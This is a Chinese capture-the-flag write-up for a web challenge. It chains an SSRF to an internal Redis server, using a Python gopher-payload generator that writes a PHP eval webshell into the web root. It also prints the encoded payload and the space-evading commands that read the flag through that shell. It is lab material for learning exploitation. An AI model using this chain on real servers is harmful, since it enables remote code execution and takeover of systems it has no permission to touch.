查看源代码发现`?secret',访问得知本地IP地址

![[EZ三剑客-EzWeb01.png]]
输入localhost，发现应该是SSRF漏洞，顺便扫描C段地址

![[EZ三剑客-EzWeb02.png]]
得到目标靶机：10.244.244.232，得到新提示，于是进行尝试扫描存活端口

![[EZ三剑客-EzWeb03.png]]
得6379是有提示，于是推测有漏洞主机redis服务，开始构造payload
```python
import urllib

protocol = "gopher://"
ip = "10.244.244.232"  # 漏洞redis主机的ip 
port = "6379" # port
shell = "\n\n<?php eval($_GET[\"cmd\"]);?>\n\n"
filename = "shell.php"
path = "/var/www/html"
passwd = ""

cmd = [
    "flushall",
    "set 1 {}".format(shell.replace(" ", "${IFS}")),
    "config set dir {}".format(path),
    "config set dbfilename {}".format(filename),
    "save"
]

if passwd:
    cmd.insert(0, "AUTH {}".format(passwd))

payload = protocol + ip + ":" + port + "/_"


def redis_format(arr):
    CRLF = "\r\n"
    redis_arr = arr.split(" ")
    cmd = ""
    cmd += "*" + str(len(redis_arr))
    
    for x in redis_arr:
        cmd += CRLF + "$" + str(len((x.replace("${IFS}", " ")))) + CRLF + x.replace("${IFS}", " ")
    cmd += CRLF
    
    return cmd


if __name__ == "__main__":
    for x in cmd:
        payload += urllib.quote(redis_format(x))
    print payload
```


`gopher://10.244.244.232:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A`


![[EZ三剑客-EzWeb04.png]]

?url=173.11.248.11/shell.php?cmd=system(‘cat$IFS$9/flag’);show_source(’/flag’);highlight_file(’/flag’)这三种都行这里不能有空格 不然会Bad Request